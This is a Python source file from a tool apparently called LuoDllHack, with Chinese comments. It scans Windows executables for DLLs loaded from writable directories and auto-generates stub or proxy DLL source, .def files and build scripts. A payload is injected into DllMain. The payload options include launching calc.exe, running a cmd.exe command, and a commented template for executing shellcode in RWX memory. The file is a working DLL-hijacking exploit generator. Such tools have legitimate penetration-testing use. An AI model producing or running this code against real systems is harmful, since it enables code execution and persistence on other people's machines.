# -*- coding: utf-8 -*-
"""
luodllhack/dll_hijack/hijack_gen.py - DLL 劫持 PoC 自动生成器

整合扫描器和代理生成器，自动生成 DLL 劫持 PoC。

工作流程:
1. 扫描目标 PE，识别可劫持 DLL
2. 根据风险类型选择生成策略:
   - CRITICAL (不存在): 从导入表推断导出，生成 stub
   - HIGH/MEDIUM (存在): 从系统 DLL 提取导出，生成代理
3. 生成代码并可选编译

用法:
    generator = HijackGenerator()
    results = generator.generate_for_target("app.exe", output_dir="./poc")
"""

import os
import shutil
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field

from .scanner import HijackScanner, RiskLevel, DllDependency, PEScanResult
from .generator import ProxyGenerator
from .models import Architecture
from .emitters import CCodeEmitter, DefFileEmitter, BuildScriptEmitter
from luodllhack.core.signatures.models import FunctionSignature as ExportSymbol, CallingConvention

logger = logging.getLogger(__name__)


@dataclass
class HijackTarget:
    """劫持目标"""
    pe_path: Path                      # 目标 PE 文件
    dll_name: str                      # 要劫持的 DLL 名称
    risk_level: RiskLevel              # 风险等级
    is_delay_load: bool                # 是否延迟加载
    required_exports: List[str]        # 需要的导出函数
    system_dll_path: Optional[Path]    # 系统 DLL 路径 (如存在)
    output_dir: Optional[Path] = None  # 输出目录


@dataclass
class GenerationResult:
    """生成结果"""
    target: HijackTarget
    success: bool
    files: List[Path] = field(default_factory=list)
    error: Optional[str] = None
    compiled_dll: Optional[Path] = None


class HijackGenerator:
    """DLL 劫持 PoC 生成器"""

    def __init__(self, payload_type: str = "messagebox"):
        """
        初始化生成器

        Args:
            payload_type: 载荷类型
                - "messagebox": 弹出消息框 (默认，用于演示)
                - "calc": 启动计算器
                - "cmd": 执行自定义命令
                - "shellcode": 执行 shellcode
                - "none": 仅转发，无载荷
        """
        self.payload_type = payload_type
        self.scanner = HijackScanner(skip_system=False)
        self.proxy_gen = ProxyGenerator()

    def scan_and_identify(self, target_path: str,
                         min_risk: RiskLevel = RiskLevel.HIGH,
                         merge_imports: bool = True) -> List[HijackTarget]:
        """
        扫描目标并识别可劫持的 DLL

        Args:
            target_path: 目标 PE 文件或目录
            min_risk: 最小风险等级 (默认 HIGH)
            merge_imports: 是否合并同目录下所有 PE 对同一 DLL 的导入 (默认 True)

        Returns:
            可劫持目标列表
        """
        # 扫描
        results, summary = self.scanner.scan(target_path, recursive=False)

        # 筛选优先级
        risk_priority = {
            RiskLevel.CRITICAL: 4,
            RiskLevel.HIGH: 3,
            RiskLevel.MEDIUM: 2,
            RiskLevel.LOW: 1,
        }
        min_priority = risk_priority.get(min_risk, 2)

        if merge_imports:
            # 合并模式：按 DLL 名称分组，合并所有导入函数
            dll_imports: Dict[str, Dict] = {}  # dll_name -> {info}

            for result in results:
                if not result.dir_writable:
                    continue

                for dep in result.dependencies:
                    dep_priority = risk_priority.get(dep.risk_level, 0)
                    if dep_priority < min_priority:
                        continue

                    dll_key = dep.name.lower()
                    if dll_key not in dll_imports:
                        dll_imports[dll_key] = {
                            'dll_name': dep.name,
                            'pe_path': result.path,
                            'risk_level': dep.risk_level,
                            'is_delay_load': dep.is_delay_load,
                            'exports': set(dep.imported_functions),
                            'system_dll_path': Path(dep.system_path) if dep.system_path else None
                        }
                    else:
                        # 合并导入函数
                        dll_imports[dll_key]['exports'].update(dep.imported_functions)
                        # 保留更高的风险等级
                        if risk_priority.get(dep.risk_level, 0) > risk_priority.get(dll_imports[dll_key]['risk_level'], 0):
                            dll_imports[dll_key]['risk_level'] = dep.risk_level

            # 创建目标列表
            targets = []
            for dll_info in dll_imports.values():
                target = HijackTarget(
                    pe_path=dll_info['pe_path'],
                    dll_name=dll_info['dll_name'],
                    risk_level=dll_info['risk_level'],
                    is_delay_load=dll_info['is_delay_load'],
                    required_exports=sorted(dll_info['exports']),  # 排序后的列表
                    system_dll_path=dll_info['system_dll_path']
                )
                targets.append(target)

            logger.info(f"合并导入: {len(targets)} 个唯一 DLL")
            return targets

        else:
            # 原始模式：每个 PE 文件的每个依赖单独处理
            targets = []
            for result in results:
                if not result.dir_writable:
                    continue

                for dep in result.dependencies:
                    dep_priority = risk_priority.get(dep.risk_level, 0)
                    if dep_priority >= min_priority:
                        target = HijackTarget(
                            pe_path=result.path,
                            dll_name=dep.name,
                            risk_level=dep.risk_level,
                            is_delay_load=dep.is_delay_load,
                            required_exports=dep.imported_functions.copy(),
                            system_dll_path=Path(dep.system_path) if dep.system_path else None
                        )
                        targets.append(target)

            return targets

    def collect_all_imports(self, target_dir: Path, dll_name: str,
                            recursive: bool = False) -> List[str]:
        """
        直接扫描目录下所有 PE 文件，收集对指定 DLL 的所有导入函数

        Args:
            target_dir: 目标目录
            dll_name: DLL 名称
            recursive: 是否递归扫描子目录

        Returns:
            导入函数名称列表
        """
        try:
            import pefile
        except ImportError:
            logger.warning("pefile not available for deep scan")
            return []

        all_imports = set()
        dll_name_lower = dll_name.lower()

        # 扫描目录下所有 PE 文件
        patterns = ['*.exe', '*.dll']
        glob_method = target_dir.rglob if recursive else target_dir.glob

        for pattern in patterns:
            for pe_path in glob_method(pattern):
                try:
                    pe = pefile.PE(str(pe_path), fast_load=False)

                    # 常规导入表
                    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
                        for entry in pe.DIRECTORY_ENTRY_IMPORT:
                            entry_dll = entry.dll.decode().lower()
                            if entry_dll == dll_name_lower:
                                for imp in entry.imports:
                                    if imp.name:
                                        all_imports.add(imp.name.decode())

                    # 延迟加载导入表
                    if hasattr(pe, 'DIRECTORY_ENTRY_DELAY_IMPORT'):
                        for entry in pe.DIRECTORY_ENTRY_DELAY_IMPORT:
                            entry_dll = entry.dll.decode().lower()
                            if entry_dll == dll_name_lower:
                                for imp in entry.imports:
                                    if imp.name:
                                        all_imports.add(imp.name.decode())

                    pe.close()
                except Exception:
                    pass

        logger.info(f"深度扫描 {dll_name}: 找到 {len(all_imports)} 个导入")
        return sorted(all_imports)

    def generate_for_target(self, target: HijackTarget,
                           output_dir: Path) -> GenerationResult:
        """
        为单个目标生成劫持 DLL

        Args:
            target: 劫持目标
            output_dir: 输出目录

        Returns:
            生成结果
        """
        result = GenerationResult(target=target, success=False)

        # 确保 output_dir 是 Path 对象
        if isinstance(output_dir, str):
            output_dir = Path(output_dir)
        target.output_dir = output_dir

        try:
            output_dir.mkdir(parents=True, exist_ok=True)

            if target.risk_level == RiskLevel.CRITICAL:
                # DLL 不存在：生成 stub
                result = self._generate_stub(target, output_dir)
            else:
                # DLL 存在：生成代理
                result = self._generate_proxy(target, output_dir)

        except Exception as e:
            result.error = str(e)
            logger.error(f"生成失败 {target.dll_name}: {e}")

        return result

    def _generate_stub(self, target: HijackTarget,
                      output_dir: Path,
                      deep_scan: bool = True) -> GenerationResult:
        """
        生成 stub DLL (用于不存在的 DLL)

        Args:
            target: 劫持目标
            output_dir: 输出目录
            deep_scan: 是否深度扫描目录下所有 PE 获取完整导入列表
        """
        result = GenerationResult(target=target, success=False)

        dll_name = target.dll_name
        base_name = Path(dll_name).stem

        # 收集导出函数
        required_exports = set(target.required_exports)

        # 深度扫描：收集目录下所有 PE 对该 DLL 的导入
        if deep_scan:
            target_dir = target.pe_path.parent
            all_imports = self.collect_all_imports(target_dir, dll_name)
            if all_imports:
                logger.info(f"深度扫描补充 {len(all_imports)} 个导入函数")
                required_exports.update(all_imports)

        # 从导入表构建导出符号
        exports = []
        for func_name in sorted(required_exports):
            # 假设 stdcall 调用约定，无参数
            export = ExportSymbol(
                name=func_name,
                ordinal=len(exports) + 1,
                rva=0,
                calling_convention=CallingConvention.STDCALL,
                is_data=False
            )
            exports.append(export)

        if not exports:
            result.error = "无导出函数信息"
            return result

        # 检测架构 (从目标 PE)
        arch = self._detect_arch(target.pe_path)

        # 生成代码
        c_code = self._generate_stub_code(base_name, exports, arch)
        def_code = self._generate_def_file(base_name, exports)
        build_script = self._generate_build_script(base_name, arch, is_stub=True)

        # 写入文件
        c_file = output_dir / f"{base_name}_stub.c"
        def_file = output_dir / f"{base_name}.def"
        build_file = output_dir / f"build_{base_name}.bat"

        c_file.write_text(c_code, encoding='utf-8')
        def_file.write_text(def_code, encoding='utf-8')
        build_file.write_text(build_script, encoding='utf-8')

        result.success = True
        result.files = [c_file, def_file, build_file]

        logger.info(f"生成 stub: {dll_name} ({len(exports)} 导出)")
        return result

    def _generate_proxy(self, target: HijackTarget,
                       output_dir: Path) -> GenerationResult:
        """生成代理 DLL (用于存在的系统 DLL)"""
        result = GenerationResult(target=target, success=False)

        if not target.system_dll_path or not target.system_dll_path.exists():
            result.error = f"系统 DLL 不存在: {target.system_dll_path}"
            return result

        try:
            # 确保目录存在
            output_dir.mkdir(parents=True, exist_ok=True)

            # 使用现有的 ProxyGenerator (需要 Path 对象)
            gen_result = self.proxy_gen.generate(
                target.system_dll_path,
                output_dir
            )

            if gen_result.get('success'):
                result.success = True
                result.files = [Path(f) for f in gen_result.get('files', [])]

                # 注入载荷到生成的 C 文件
                self._inject_payload_to_proxy(output_dir)
            else:
                result.error = str(gen_result.get('errors', ['Unknown error']))

        except Exception as e:
            result.error = str(e)

        return result

    def _inject_payload_to_proxy(self, output_dir: Path):
        """注入载荷到代理 DLL 代码"""
        # 查找生成的 C 文件并注入载荷
        for c_file in output_dir.glob("*.c"):
            try:
                content = c_file.read_text(encoding='utf-8')

                # 查找 DllMain 中的 DLL_PROCESS_ATTACH
                if 'DLL_PROCESS_ATTACH' in content and self.payload_type != 'none':
                    payload_code = self._get_payload_code()
                    # 在 case DLL_PROCESS_ATTACH: 后插入载荷
                    content = content.replace(
                        'case DLL_PROCESS_ATTACH:',
                        f'case DLL_PROCESS_ATTACH:\n{payload_code}'
                    )
                    c_file.write_text(content, encoding='utf-8')
            except Exception as e:
                logger.warning(f"注入载荷失败 {c_file}: {e}")

    def _generate_stub_code(self, base_name: str,
                           exports: List[ExportSymbol],
                           arch: Architecture) -> str:
        """生成 stub C 代码"""
        payload = self._get_payload_code()

        code = f'''// Auto-generated DLL hijack stub for {base_name}.dll
// Generated by LuoDllHack DLL Hijack Generator
// WARNING: For authorized security testing only!

#include <windows.h>

// 初始化标志
static BOOL g_initialized = FALSE;

// 载荷执行
static void ExecutePayload(void) {{
    if (g_initialized) return;
    g_initialized = TRUE;

{payload}
}}

// DLL 入口点
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {{
    switch (reason) {{
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            ExecutePayload();
            break;
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}

// 导出函数 (stub)
'''
        # 生成每个导出函数的 stub
        for export in exports:
            func_name = export.name
            # 生成一个空函数，返回 0
            if arch == Architecture.X64:
                code += f'''
__declspec(dllexport) DWORD_PTR __stdcall {func_name}(void) {{
    return 0;
}}
'''
            else:
                code += f'''
__declspec(dllexport) DWORD __stdcall {func_name}(void) {{
    return 0;
}}
'''
        return code

    def _generate_def_file(self, base_name: str,
                          exports: List[ExportSymbol]) -> str:
        """生成 .def 文件"""
        lines = [
            f"LIBRARY {base_name}",
            "EXPORTS"
        ]
        for i, export in enumerate(exports, 1):
            lines.append(f"    {export.name} @{i}")
        return '\n'.join(lines)

    def _generate_build_script(self, base_name: str,
                              arch: Architecture,
                              is_stub: bool = False) -> str:
        """生成编译脚本"""
        suffix = "_stub" if is_stub else "_proxy"

        if arch == Architecture.X64:
            cl_flags = "/LD /O2 /MT /GS- /DWIN64"
            link_flags = "/MACHINE:X64"
        else:
            cl_flags = "/LD /O2 /MT /GS- /DWIN32"
            link_flags = "/MACHINE:X86"

        return f'''@echo off
REM Build script for {base_name}.dll
REM Requires Visual Studio Developer Command Prompt

echo Building {base_name}.dll...

cl {cl_flags} {base_name}{suffix}.c /Fe:{base_name}.dll /link {link_flags} /DEF:{base_name}.def user32.lib

if exist {base_name}.dll (
    echo [+] Success: {base_name}.dll created
) else (
    echo [-] Failed to build
)

pause
'''

    def _get_payload_code(self) -> str:
        """获取载荷代码"""
        if self.payload_type == "messagebox":
            return '''    MessageBoxW(NULL, L"DLL Hijack PoC - LuoDllHack", L"Security Test", MB_OK | MB_ICONWARNING);'''
        elif self.payload_type == "calc":
            return '''    WinExec("calc.exe", SW_SHOW);'''
        elif self.payload_type == "cmd":
            return '''    // TODO: Replace with your command
    WinExec("cmd.exe /c echo Hijacked!", SW_SHOW);'''
        elif self.payload_type == "shellcode":
            return '''    // TODO: Add shellcode execution
    // unsigned char shellcode[] = { ... };
    // LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // memcpy(mem, shellcode, sizeof(shellcode));
    // ((void(*)())mem)();'''
        else:
            return '''    // No payload'''

    def _detect_arch(self, pe_path: Path) -> Architecture:
        """检测 PE 架构"""
        try:
            import pefile
            pe = pefile.PE(str(pe_path), fast_load=True)
            if pe.FILE_HEADER.Machine == 0x8664:  # AMD64
                return Architecture.X64
            elif pe.FILE_HEADER.Machine == 0xAA64:  # ARM64
                return Architecture.ARM64
            else:
                return Architecture.X86
        except:
            return Architecture.X64  # 默认 64 位

    def generate_all(self, target_path: str,
                    output_dir: str,
                    min_risk: RiskLevel = RiskLevel.HIGH,
                    max_targets: int = 10) -> List[GenerationResult]:
        """
        批量生成所有可劫持 DLL 的 PoC

        Args:
            target_path: 目标 PE 文件或目录
            output_dir: 输出目录
            min_risk: 最小风险等级
            max_targets: 最大目标数量

        Returns:
            生成结果列表
        """
        results = []
        output_base = Path(output_dir)

        # 扫描并识别目标
        targets = self.scan_and_identify(target_path, min_risk)

        if not targets:
            logger.info("未找到可劫持目标")
            return results

        logger.info(f"找到 {len(targets)} 个可劫持目标")

        # 限制数量
        targets = targets[:max_targets]

        # 按 DLL 名称分组，避免重复生成
        seen_dlls = set()

        for target in targets:
            dll_key = (target.dll_name.lower(), target.risk_level)
            if dll_key in seen_dlls:
                continue
            seen_dlls.add(dll_key)

            # 为每个目标创建子目录
            target_dir = output_base / Path(target.dll_name).stem

            result = self.generate_for_target(target, target_dir)
            results.append(result)

            if result.success:
                logger.info(f"[+] 生成成功: {target.dll_name}")
            else:
                logger.warning(f"[-] 生成失败: {target.dll_name} - {result.error}")

        return results


# =============================================================================
# 便捷函数
# =============================================================================

def generate_hijack_poc(target_pe: str,
                       output_dir: str,
                       payload: str = "messagebox",
                       min_risk: str = "high") -> List[GenerationResult]:
    """
    便捷函数：为目标 PE 生成 DLL 劫持 PoC

    Args:
        target_pe: 目标 PE 文件路径
        output_dir: 输出目录
        payload: 载荷类型 (messagebox/calc/cmd/shellcode/none)
        min_risk: 最小风险等级 (critical/high/medium/low)

    Returns:
        生成结果列表
    """
    risk_map = {
        "critical": RiskLevel.CRITICAL,
        "high": RiskLevel.HIGH,
        "medium": RiskLevel.MEDIUM,
        "low": RiskLevel.LOW,
    }

    generator = HijackGenerator(payload_type=payload)
    return generator.generate_all(
        target_pe,
        output_dir,
        min_risk=risk_map.get(min_risk.lower(), RiskLevel.HIGH)
    )
